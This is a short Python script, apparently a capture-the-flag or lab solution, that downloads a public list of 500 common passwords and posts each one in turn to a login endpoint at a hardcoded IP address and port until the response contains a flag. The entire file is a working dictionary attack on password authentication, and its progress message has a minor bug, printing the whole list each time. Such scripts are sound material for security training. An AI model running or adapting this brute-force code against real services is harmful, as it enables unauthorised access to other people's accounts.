import requests
ip = "94.237.53.203"
port = 30359

passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

for password in passwords:
    print(f"Attempts password: {passwords}")

    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
